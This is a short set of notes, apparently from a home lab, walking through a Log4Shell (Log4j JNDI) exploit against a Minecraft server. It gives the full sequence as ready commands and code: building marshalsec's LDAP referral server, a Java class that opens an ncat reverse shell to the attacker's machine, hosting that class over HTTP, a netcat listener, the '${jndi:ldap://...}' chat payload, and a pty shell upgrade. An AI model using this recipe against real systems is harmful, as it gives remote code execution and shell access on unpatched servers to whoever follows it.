Log4j Exploit: 

mbechler/marshalsec (https://github.com/mbechler/marshalsec)

Overview:

This java program will start a LDAP server on our kali machine that will refer our jndi requests to our simple web server hosting the payload.

Steps:
Git clone https://github.com/mbechler/marshalsec

Sudo apt install maven (maven will make the exploit function)

mvn clean package -DskipTests
 
Git clone https://github.com/xiajun325/apache-log4j-rce-poc
 
Change the log4jrce.java file to initiate a reverse shell on the kali machine. 
 
Vim Log4jRCE.java
 
public class Log4jRCE { 
static { 
try { Runtime.getRuntime().exec("ncat -e /bin/bash 192.168.56.102 9999").waitFor(); 
} catch (Exception e) { 
e.printStackTrace();
 }}}
 
Compile the java file;
javac log4jRCE.java

Starting the LDAP server:
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://192.168.56.102:8000/#Log4jRCE"
 
Start webserver in the directory where the log4jrce.java file is located. *important*
Python3 -m http.server

Start netcat listener to catch the reverse shell connection in Kali:
nc -nlvp 9999
 
From minecraft instance:
Type ‘t’ to talk and enter:
${jndi:ldap://192.168.56.102:1389/Log4jRCE}
*Where port 1389 is the LDAP server*

Once connection is intiated, type "whoami" to confirm user identity.

Next, import a pretty shell by using:
python3 -c 'import pty; pty.spawn("/bin/bash")'

